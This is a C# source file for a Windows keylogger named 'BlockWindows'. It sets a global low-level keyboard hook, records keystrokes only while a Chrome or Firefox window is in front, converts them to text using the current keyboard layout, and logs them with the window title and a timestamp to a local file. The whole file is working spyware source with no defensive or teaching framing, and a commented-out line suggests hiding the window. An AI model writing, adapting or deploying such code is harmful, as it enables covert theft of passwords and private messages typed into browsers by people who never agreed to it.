using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Text;
using System.Runtime.InteropServices;
using System.Linq;
using System.IO;
using System.Globalization;


class BlockWindows
{
    enum VirtualKeyStates : int
    {
        VK_LBUTTON = 0x01,
        VK_RBUTTON = 0x02,
        VK_CANCEL = 0x03,
        VK_MBUTTON = 0x04,
        //
        VK_XBUTTON1 = 0x05,
        VK_XBUTTON2 = 0x06,
        //
        VK_BACK = 0x08,
        VK_TAB = 0x09,
        //
        VK_CLEAR = 0x0C,
        VK_RETURN = 0x0D,
        //
        VK_SHIFT = 0x10,
        VK_CONTROL = 0x11,
        VK_MENU = 0x12,
        VK_PAUSE = 0x13,
        VK_CAPITAL = 0x14,
        //
        VK_KANA = 0x15,
        VK_HANGEUL = 0x15,  /* old name - should be here for compatibility */
        VK_HANGUL = 0x15,
        VK_JUNJA = 0x17,
        VK_FINAL = 0x18,
        VK_HANJA = 0x19,
        VK_KANJI = 0x19,
        //
        VK_ESCAPE = 0x1B,
        //
        VK_CONVERT = 0x1C,
        VK_NONCONVERT = 0x1D,
        VK_ACCEPT = 0x1E,
        VK_MODECHANGE = 0x1F,
        //
        VK_SPACE = 0x20,
        VK_PRIOR = 0x21,
        VK_NEXT = 0x22,
        VK_END = 0x23,
        VK_HOME = 0x24,
        VK_LEFT = 0x25,
        VK_UP = 0x26,
        VK_RIGHT = 0x27,
        VK_DOWN = 0x28,
        VK_SELECT = 0x29,
        VK_PRINT = 0x2A,
        VK_EXECUTE = 0x2B,
        VK_SNAPSHOT = 0x2C,
        VK_INSERT = 0x2D,
        VK_DELETE = 0x2E,
        VK_HELP = 0x2F,
        //
        VK_LWIN = 0x5B,
        VK_RWIN = 0x5C,
        VK_APPS = 0x5D,
        //
        VK_SLEEP = 0x5F,
        //
        VK_NUMPAD0 = 0x60,
        VK_NUMPAD1 = 0x61,
        VK_NUMPAD2 = 0x62,
        VK_NUMPAD3 = 0x63,
        VK_NUMPAD4 = 0x64,
        VK_NUMPAD5 = 0x65,
        VK_NUMPAD6 = 0x66,
        VK_NUMPAD7 = 0x67,
        VK_NUMPAD8 = 0x68,
        VK_NUMPAD9 = 0x69,
        VK_MULTIPLY = 0x6A,
        VK_ADD = 0x6B,
        VK_SEPARATOR = 0x6C,
        VK_SUBTRACT = 0x6D,
        VK_DECIMAL = 0x6E,
        VK_DIVIDE = 0x6F,
        VK_F1 = 0x70,
        VK_F2 = 0x71,
        VK_F3 = 0x72,
        VK_F4 = 0x73,
        VK_F5 = 0x74,
        VK_F6 = 0x75,
        VK_F7 = 0x76,
        VK_F8 = 0x77,
        VK_F9 = 0x78,
        VK_F10 = 0x79,
        VK_F11 = 0x7A,
        VK_F12 = 0x7B,
        VK_F13 = 0x7C,
        VK_F14 = 0x7D,
        VK_F15 = 0x7E,
        VK_F16 = 0x7F,
        VK_F17 = 0x80,
        VK_F18 = 0x81,
        VK_F19 = 0x82,
        VK_F20 = 0x83,
        VK_F21 = 0x84,
        VK_F22 = 0x85,
        VK_F23 = 0x86,
        VK_F24 = 0x87,
        //
        VK_NUMLOCK = 0x90,
        VK_SCROLL = 0x91,
        //
        VK_OEM_NEC_EQUAL = 0x92,   // '=' key on numpad
        //
        VK_OEM_FJ_JISHO = 0x92,   // 'Dictionary' key
        VK_OEM_FJ_MASSHOU = 0x93,   // 'Unregister word' key
        VK_OEM_FJ_TOUROKU = 0x94,   // 'Register word' key
        VK_OEM_FJ_LOYA = 0x95,   // 'Left OYAYUBI' key
        VK_OEM_FJ_ROYA = 0x96,   // 'Right OYAYUBI' key
        //
        VK_LSHIFT = 0xA0,
        VK_RSHIFT = 0xA1,
        VK_LCONTROL = 0xA2,
        VK_RCONTROL = 0xA3,
        VK_LMENU = 0xA4,
        VK_RMENU = 0xA5,
        //
        VK_BROWSER_BACK = 0xA6,
        VK_BROWSER_FORWARD = 0xA7,
        VK_BROWSER_REFRESH = 0xA8,
        VK_BROWSER_STOP = 0xA9,
        VK_BROWSER_SEARCH = 0xAA,
        VK_BROWSER_FAVORITES = 0xAB,
        VK_BROWSER_HOME = 0xAC,
        //
        VK_VOLUME_MUTE = 0xAD,
        VK_VOLUME_DOWN = 0xAE,
        VK_VOLUME_UP = 0xAF,
        VK_MEDIA_NEXT_TRACK = 0xB0,
        VK_MEDIA_PREV_TRACK = 0xB1,
        VK_MEDIA_STOP = 0xB2,
        VK_MEDIA_PLAY_PAUSE = 0xB3,
        VK_LAUNCH_MAIL = 0xB4,
        VK_LAUNCH_MEDIA_SELECT = 0xB5,
        VK_LAUNCH_APP1 = 0xB6,
        VK_LAUNCH_APP2 = 0xB7,
        //
        VK_OEM_1 = 0xBA,   // ';:' for US
        VK_OEM_PLUS = 0xBB,   // '+' any country
        VK_OEM_COMMA = 0xBC,   // ',' any country
        VK_OEM_MINUS = 0xBD,   // '-' any country
        VK_OEM_PERIOD = 0xBE,   // '.' any country
        VK_OEM_2 = 0xBF,   // '/?' for US
        VK_OEM_3 = 0xC0,   // '`~' for US
        //
        VK_OEM_4 = 0xDB,  //  '[{' for US
        VK_OEM_5 = 0xDC,  //  '\|' for US
        VK_OEM_6 = 0xDD,  //  ']}' for US
        VK_OEM_7 = 0xDE,  //  ''"' for US
        VK_OEM_8 = 0xDF,
        //
        VK_OEM_AX = 0xE1,  //  'AX' key on Japanese AX kbd
        VK_OEM_102 = 0xE2,  //  "<>" or "\|" on RT 102-key kbd.
        VK_ICO_HELP = 0xE3,  //  Help key on ICO
        VK_ICO_00 = 0xE4,  //  00 key on ICO
        //
        VK_PROCESSKEY = 0xE5,
        //
        VK_ICO_CLEAR = 0xE6,
        //
        VK_PACKET = 0xE7,
        //
        VK_OEM_RESET = 0xE9,
        VK_OEM_JUMP = 0xEA,
        VK_OEM_PA1 = 0xEB,
        VK_OEM_PA2 = 0xEC,
        VK_OEM_PA3 = 0xED,
        VK_OEM_WSCTRL = 0xEE,
        VK_OEM_CUSEL = 0xEF,
        VK_OEM_ATTN = 0xF0,
        VK_OEM_FINISH = 0xF1,
        VK_OEM_COPY = 0xF2,
        VK_OEM_AUTO = 0xF3,
        VK_OEM_ENLW = 0xF4,
        VK_OEM_BACKTAB = 0xF5,
        //
        VK_ATTN = 0xF6,
        VK_CRSEL = 0xF7,
        VK_EXSEL = 0xF8,
        VK_EREOF = 0xF9,
        VK_PLAY = 0xFA,
        VK_ZOOM = 0xFB,
        VK_NONAME = 0xFC,
        VK_PA1 = 0xFD,
        VK_OEM_CLEAR = 0xFE
    }
    private struct KeyMessage
    {
        private string _message;
        public string Message { get { return _message; } }

        public void Write()
        {
            if (Message.Length > 0)
            {
                string windowTitle = GetForeWindowTitle();
                using (StreamWriter sw = new StreamWriter("file.txt", true, Encoding.Unicode))
                {
                    sw.Write('[' + windowTitle + ']' + DateTime.Now.ToString());
                    sw.Write("\r\n" + _message + "\r\n");
                    _message = "";
                }
            }
        }

        public void AddChar(char c)
        {
            _message += c;
        }

        public void AddChar(Keys key)
        {
            IntPtr fore = GetForegroundWindow();
            uint tpid = GetWindowThreadProcessId(fore, IntPtr.Zero);
            byte [] keys = new byte[256];
            StringBuilder b = new StringBuilder(100);
            IntPtr hKL = GetKeyboardLayout(tpid);
            hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);
            GetKeyboardState(keys);
            ToUnicodeEx(
                    (uint)key,
                    (uint)key,
                    keys,
                    b,
                    100,
                    0,
                    hKL
                );
//            Console.WriteLine(b.ToString());

            _message += b.ToString();
        }

    }

    static KeyMessage Message = new KeyMessage();

    #region Marshaled
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetKeyboardState(byte[] lpKeyState);

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("User32.dll")]
    public static extern int GetWindowText(IntPtr hwnd, StringBuilder s, int nMaxCount);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
                                                  HookProc lpfn,
                                                  IntPtr hMod,
                                                  uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk,
                                                int nCode,
                                                IntPtr wParam,
                                                IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private const uint WINEVENT_OUTOFCONTEXT = 0;
    private const uint EVENT_SYSTEM_FOREGROUND = 3;

    delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

    [DllImport("user32.dll")]
    static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

    private const int WH_KEYBOARD_LL = 13;// WH_KEYBOARD
    private const int WM_KEYDOWN = 256;
    private static IntPtr keyBoardHook = IntPtr.Zero;
    private static IntPtr mouseHook = IntPtr.Zero;


    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);

    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint virtualKeyCode, uint scanCode,
        byte[] keyboardState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
        StringBuilder receivingBuffer,
        int bufferSize, uint flags);

    [DllImport("user32.dll")]
    static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
       lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
       int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    static extern IntPtr GetKeyboardLayout(uint idThread);

    #endregion


    static WinEventDelegate dele = null;
    static IntPtr winHook = (IntPtr)0;
    static Timer t = new Timer();
    public static void Main()
    {
        keyBoardHook = SetKeyBoardHook();
        ApplicationContext ctx = new ApplicationContext();
        ctx.ThreadExit += delegate(object sender, EventArgs e)
        {
            UnhookWindowsHookEx(keyBoardHook);
        };
        if (FindWindow(null, GetForeWindowTitle()) != IntPtr.Zero)
        {
            //    ShowWindow(c, 0);
        }
        t.Interval = 2000;
        t.Tick += (f, a) =>
            {
                Message.Write();
                t.Stop();
            };
        //winHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
        Application.Run(ctx);
    }

    private static CultureInfo CurrentCulture
    {
        get
        {
            IntPtr fore = GetForegroundWindow();
            uint tpid = GetWindowThreadProcessId(fore, IntPtr.Zero);
            IntPtr hKL = GetKeyboardLayout(tpid);
            hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);
            return new System.Globalization.CultureInfo(hKL.ToInt32());
        }
    }

    static string GetCharsFromKeys(Keys keys, bool shift, bool altGr)
    {
        var buf = new StringBuilder(256);
        var keyboardState = new byte[256];
        if (shift)
            keyboardState[(int)Keys.ShiftKey] = 0xff;
        if (altGr)
        {
            keyboardState[(int)Keys.ControlKey] = 0xff;
            keyboardState[(int)Keys.Menu] = 0xff;
        }
        ToUnicode((uint)keys, 0, keyboardState, buf, 256, 0);
        return buf.ToString();
    }
    private static IntPtr SetKeyBoardHook()
    {
        Process curProcess = Process.GetCurrentProcess();
        ProcessModule curModule = curProcess.MainModule;
        return SetWindowsHookEx(WH_KEYBOARD_LL,
                                HookCallback,
                                GetModuleHandle(curModule.ModuleName),
                                0);
    }

    static IntPtr SetMouseHook()
    {
        Process curProcess = Process.GetCurrentProcess();
        ProcessModule curModule = curProcess.MainModule;
        return SetWindowsHookEx(14,
                                MouseHookCallback,
                                GetModuleHandle(curModule.ModuleName),
                                0);
    }

    static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {

        }
        return CallNextHookEx(mouseHook, nCode, wParam, lParam);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (IsBrowser(GetForeWindowTitle()))
        {
            int code = Marshal.ReadInt32(lParam);
            Keys pressedKey = (Keys)code;

            char symbol = pressedKey.ToString()[0];
            Console.WriteLine(CurrentCulture.Name);
            Message.AddChar(pressedKey);

            t.Stop();

            t.Start();//restart timer
        }

        return CallNextHookEx(keyBoardHook, nCode, wParam, lParam);
    }

    private static string GetForeWindowTitle()
    {
        IntPtr fore = GetForegroundWindow();

        const int count = 512;
        StringBuilder title = new StringBuilder(count);
        int t = GetWindowText(fore, title, count);

        return (t > 0) ? title.ToString() : "";
    }

    private static string[] _browsers = new string[2]
    {
                "Google Chrome",
                "Mozilla Firefox"
    };

    private static bool IsBrowser(string str)
    {
        return (from b in _browsers
                where str.IndexOf(b) != -1
                select b).Count() > 0;
    }

    static string GetCharPressed(Keys key)
    {
        KeysConverter k = new KeysConverter();

        return k.ConvertToString(key);
    }

    public static void WinChangeProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
    {
        MessageBox.Show("hello");
    }

}
